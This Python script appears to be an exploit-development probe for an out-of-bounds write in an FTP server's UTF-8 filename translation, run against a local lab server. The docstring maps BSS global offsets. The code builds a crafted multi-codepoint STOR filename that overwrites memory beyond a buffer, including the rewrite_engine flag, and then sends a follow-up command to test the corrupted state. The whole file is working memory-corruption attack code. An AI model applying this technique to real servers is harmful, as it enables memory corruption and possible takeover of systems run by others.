#!/usr/bin/env python3
"""Test whether the utf8trans OOB write reaches a global BEYOND `substr`.

BSS: ucs4_longs @ 0x104920/0x2000, utf8_val @ 0x106920/0x400,
substr @ 0x106d20/8, ..., rewrite_engine @ 0x106e20/1.

Second-loop index i writes utf8_val[i] = (unsigned char)ucs4_longs[i];
ucs4_longs[i] aliases utf8_val[8*(i-1024)] for i>=1024.  For i>=1171 the
aliased slot is still the FIRST loop's 8-byte value at that address, so the
byte written equals low(code point i).  rewrite_engine is at i=1280, hence
code point 1280 controls it when N>=1281.  Engine byte 0 is set to 0 when
ENGINE_ZERO=1 (code point U+0100), else left as 'A'.

`substr` bytes 0..5 come from code points 0,8,16,24,32,40 (client4 rule),
so the same key also plants the benign .rodata marker.
"""
import io
import os
import socket
import time
import ftplib

host, port = "127.0.0.1", 21874
for _ in range(40):
    try:
        s = socket.create_connection((host, port), 1)
        s.close()
        break
    except OSError:
        time.sleep(0.25)

zero = os.environ.get("ENGINE_ZERO", "1") == "1"
n = int(os.environ.get("KEY_N", "1281"))
tail = ["\u00af", "\u01d4", "`", "U", "U", "U"]  # af d4 60 55 55 55
cps = ["A"] * n
for k, ch in enumerate(tail):
    if 8 * k < n:
        cps[8 * k] = ch
# At N>=1153 the FIRST loop also writes all 8 bytes of substr (j=1152),
# so bytes 6/7 must be restored to zero via cps[48]/cps[56].
if n > 1152:
    cps[48] = "\u0100"
    cps[56] = "\u0100"
if n >= 1281:
    cps[1280] = "\u0100" if zero else "A"
key = "".join(cps)
wire_key = key.encode("utf-8").decode("latin-1")
print("ENGINE_ZERO=%d KEY_CODEPOINTS=%d CP1280=%s" %
      (int(zero), len(key), ("%04x" % ord(cps[1280])) if n >= 1281 else "-"))

ftp = ftplib.FTP(encoding="latin-1")
try:
    ftp.connect(host, port, timeout=8)
    ftp.login("labuser", "labpass")
    ftp.set_pasv(True)
    ftp.sock.settimeout(8)
    print("LOGIN_OK")
    try:
        ftp.storbinary("STOR " + wire_key, io.BytesIO(b"z" * 16))
        print("STOR_LONG_OK")
    except Exception as exc:
        print("STOR_LONG_FAIL %s: %s" % (type(exc).__name__, str(exc)[:140]))
    # A short second STOR: if rewrite_engine is still on, RewriteLog gains
    # rewrite_fixup(): executing RewriteRule + maps subst'd pattern lines.
    short = "B" * 200
    try:
        ftp.storbinary("STOR " + short, io.BytesIO(b"z" * 16))
        print("STOR_SHORT_OK")
    except Exception as exc:
        print("STOR_SHORT_FAIL %s: %s" % (type(exc).__name__, str(exc)[:140]))
    for cmd in ("NOOP", "PWD"):
        try:
            print(cmd + "=" + str(ftp.voidcmd(cmd))[:100])
        except Exception as exc:
            print(cmd + "_FAIL " + type(exc).__name__ + ": " + str(exc)[:100])
except Exception as exc:
    print("CLIENT_FAIL %s: %s" % (type(exc).__name__, str(exc)[:200]))
finally:
    try:
        ftp.close()
    except Exception:
        pass
